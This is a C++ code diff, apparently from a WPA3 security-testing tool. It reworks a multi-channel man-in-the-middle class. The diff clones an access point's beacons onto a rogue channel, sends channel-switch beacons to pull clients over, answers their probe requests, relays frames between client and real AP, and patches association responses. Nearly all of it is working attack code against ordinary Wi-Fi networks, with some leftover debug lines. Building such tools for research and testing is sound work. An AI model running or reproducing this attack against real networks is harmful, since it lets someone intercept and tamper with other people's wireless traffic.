@@ -45,19 +45,6 @@ namespace wpa3_tester{
         return 0;
     }
 
-    static void debug_send(PacketSender& sender, RawPDU& pdu, const NetworkInterface& iface, const string& tag) {
-        try {
-            const auto& payload = pdu.payload();
-            RadioTap rt(payload.data(), payload.size());
-            const auto* dot11 = rt.find_pdu<Dot11>();
-            if (dot11 && dot11->subtype() == Dot11::BEACON) {
-                const auto* mgmt = rt.find_pdu<Dot11ManagementFrame>();
-                const bool has_csa = mgmt && mgmt->search_option(Dot11::CHANNEL_SWITCH);
-                log(LogLevel::DEBUG, "[%s] Sending BEACON on %s%s", tag.c_str(), iface.name().c_str(), has_csa ? " [CSA]" : "");
-            }
-        } catch (...) {}
-    }
-
     void McMitm::run(const int timeout_sec) {
         if (!sniffer_real || !sniffer_rogue) {
             log(LogLevel::ERROR, "Sniffers not initialized before run()");
@@ -69,34 +56,11 @@ namespace wpa3_tester{
         }
 
         probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
+        beacon.reset(beacon_channel_patch(*beacon, netconfig.rogue_channel));
 
-        auto* b = new Dot11Beacon();
-        b->addr1(beacon->addr1());
-        b->addr2(beacon->addr2());
-        b->addr3(beacon->addr3());
-        b->timestamp(beacon->timestamp());
-        b->interval(beacon->interval());
-        b->capabilities() = beacon->capabilities();
-        b->ds_parameter_set(netconfig.rogue_channel);
-
-        for (const auto& opt : beacon->options()) {
-            if (opt.option() == Dot11::TIM) continue;
-            if (opt.option() == Dot11::DS_SET) continue;
-            if (opt.option() == Dot11::CHANNEL_SWITCH) throw runtime_error("Beacon contains CSA option");
-
-            if (opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
-                vector ht_data(opt.data_ptr(), opt.data_ptr() + opt.data_size());
-                ht_data[0] = netconfig.rogue_channel;
-                b->add_option({Dot11::HT_OPERATION, ht_data.size(), ht_data.data()});
-                continue;
-            }
-            b->add_option(opt);
-        }
-
-        RadioTap rt;
-        rt.inner_pdu(*beacon);
-        auto rogue_beacon_raw = rt.serialize();
-        patch_channel_raw(rogue_beacon_raw, netconfig.rogue_channel);
+        //sender_rogue->send(rt);
+        //auto rogue_beacon_raw = rt.serialize();
+        //patch_channel_raw(rogue_beacon_raw, netconfig.rogue_channel);
 
         CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
 
@@ -109,15 +73,27 @@ namespace wpa3_tester{
         pcap_setnonblock(sniffer_rogue->get_pcap_handle(), 1, nullptr);
 
         while (true) {
+            //cerr << "wadawdawd" << endl;
             if (deadline > 0 && now_sec() > deadline) {
                 log(LogLevel::INFO, "McMitm timeout reached, stopping.");
                 break;
             }
 
             auto try_sniff = [&](Sniffer& sniffer, void (McMitm::*handler)(PDU&)) {
-                if (PDU* pdu = sniffer.next_packet()) {
-                    (this->*handler)(*pdu);
-                    delete pdu;
+                const int fd = pcap_get_selectable_fd(sniffer.get_pcap_handle());
+                pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
+                if (poll(&pfd, 1, 1) <= 0) return; //10ms
+                if (!(pfd.revents & POLLIN)) return;
+
+                pcap_pkthdr* header;
+                const u_char* packet;
+                while (pcap_next_ex(sniffer.get_pcap_handle(), &header, &packet) == 1) {
+                    try{
+                        RadioTap rt_new(packet, header->caplen);
+                        (this->*handler)(rt_new);
+                    }catch(...){
+                        log(LogLevel::ERROR, "Failed to process packet");
+                    }
                 }
             };
 
@@ -127,9 +103,9 @@ namespace wpa3_tester{
             if (next_beacon <= now_sec()) {
                 //CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
 
-                RawPDU raw_pdu(rogue_beacon_raw.data(), rogue_beacon_raw.size());
-                debug_send(*sender_rogue, raw_pdu, nic_rogue_ap, "rogue");
-                sender_rogue->send(raw_pdu, nic_rogue_ap);
+                RadioTap rt;
+                rt.inner_pdu(beacon->clone());
+                sender_rogue->send(rt);
 
                 next_beacon += 0.10;
             }
@@ -143,7 +119,6 @@ namespace wpa3_tester{
                 log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
                 last_rogue_beacon = now_sec();
             }
-            this_thread::sleep_for(milliseconds(1));
         }
     }
 
@@ -175,7 +150,7 @@ namespace wpa3_tester{
 
     void McMitm::patch_channel_raw(vector<uint8_t> &raw, const uint8_t channel) {
         if (raw.size() < 4) return;
-        //dump_hex("BEFORE PATCH", raw, 48);
+        dump_hex("BEFORE PATCH", raw, 48);
 
         size_t effective_size = raw.size();
         RadioTap rt(raw.data(), raw.size());
@@ -210,7 +185,7 @@ namespace wpa3_tester{
         }
 
         raw = std::move(new_raw);
-        //dump_hex("AFTER PATCH", raw, 48);
+        dump_hex("AFTER PATCH", raw, 48);
     }
 
     void McMitm::handle_rx_real_chan(PDU& pdu) {
@@ -231,28 +206,36 @@ namespace wpa3_tester{
                 CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid,
                                             netconfig.real_channel, netconfig.rogue_channel, 1);
             }
-            //print_rx(LogLevel::DEBUG, "Real channel", *dot11);
-            return; // don't forward client→AP frames from real channel, they belong on rogue
+            print_rx(LogLevel::DEBUG, "Real channel", *dot11);
+            return;
         }
 
         // Frames from real AP — forward to rogue channel with patched channel IE
         if (addr2 == ap_mac) {
-            if (dot11->subtype() == Dot11::BEACON){
+            if (dot11->subtype() == Dot11::BEACON || dot11->subtype() == Dot11::PROBE_RESP){
                 last_real_beacon = now_sec();
                 return;
             }
 
+            if (dot11->subtype() == Dot11::ASSOC_RESP) {
+                if (const auto* assoc = pdu.find_pdu<Dot11AssocResponse>()) {
+                    const unique_ptr<Dot11AssocResponse> patched(assoc_resp_channel_patch(*assoc, netconfig.rogue_channel));
+                    RadioTap rt;
+                    rt.inner_pdu(patched->clone());
+                    sender_rogue->send(rt, nic_rogue_ap);
+                    print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM (patched AssocResp)");
+                    return;
+                }
+            }
+
+
             // Serialize, patch raw bytes, resend
-            auto raw = pdu.serialize();
-            patch_channel_raw(raw, netconfig.rogue_channel);
-
-            const uint16_t rt_len = *reinterpret_cast<const uint16_t*>(raw.data() + 2);
-            RawPDU dot11_only(raw.data() + rt_len, raw.size() - rt_len);
-
-            auto patched = RawPDU(raw.data(), raw.size());
-            debug_send(*sender_rogue, patched, nic_rogue_ap, "addr forward");
-            sender_rogue->send(patched, nic_rogue_ap);
-            //print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
+            //auto raw = pdu.serialize();
+            //patch_channel_raw(raw, netconfig.rogue_channel);
+            //auto patched = RawPDU(raw.data(), raw.size());
+            //sender_rogue->send(patched, nic_rogue_ap);
+            sender_rogue->send(pdu, nic_rogue_ap);
+            print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
         }
     }
 
@@ -268,42 +251,24 @@ namespace wpa3_tester{
         else if (const auto* data = pdu.find_pdu<Dot11Data>())
             addr2 = data->addr2().to_string();
 
-        // Frames forwarded from real AP — our own frames coming back, ignore
-        if (addr2 == ap_mac) {
-            if (dot11->subtype() == Dot11::BEACON)
-                last_rogue_beacon = now_sec();
+
+        if (dot11->subtype() == Dot11::PROBE_REQ) { // include broadcast
+            probe_resp->addr1(addr2);
+
+            RadioTap rt;
+            rt.inner_pdu(probe_resp->clone());
+            sender_rogue->send(rt);
+
+            log(LogLevel::INFO, "Replied ProbeResp to %s", addr2.c_str());
             return;
         }
 
-        if (dot11->subtype() == Dot11::PROBE_REQ) {
-            if (probe_resp) {
-                probe_resp->addr1(addr2);
 
-                try { // send to get auth
-                    const auto raw = pdu.serialize();
-                    RawPDU raw_pdu(raw.data(), raw.size());
-                    debug_send(*sender_rogue, raw_pdu, nic_rogue_ap, " probe response back");
-                    sender_real->send(raw_pdu, nic_real_ap);
-                } catch (const socket_write_error& e) {
-                    log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
-                }
-
-                RadioTap rt;
-                rt.inner_pdu(probe_resp->clone());
-                sender_rogue->send(rt);
-
-                log(LogLevel::INFO, "Replied ProbeResp to %s", addr2.c_str());
-            }
-            return;
-        }
-
-        // Frames from client -> AP
-        if (addr1 == ap_mac) {
+        if (addr1 == ap_mac && addr2 == client_mac) {
+            // Frames forwarded from real AP — our own frames coming back, ignore
+            if (dot11->subtype() == Dot11::BEACON) return;
             try {
-                const auto raw = pdu.serialize();
-                RawPDU raw_pdu(raw.data(), raw.size());
-                debug_send(*sender_rogue, raw_pdu, nic_rogue_ap, "sta -> ap");
-                sender_real->send(raw_pdu, nic_real_ap);
+                sender_real->send(pdu, nic_real_ap);
             } catch (const socket_write_error& e) {
                 log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
             }
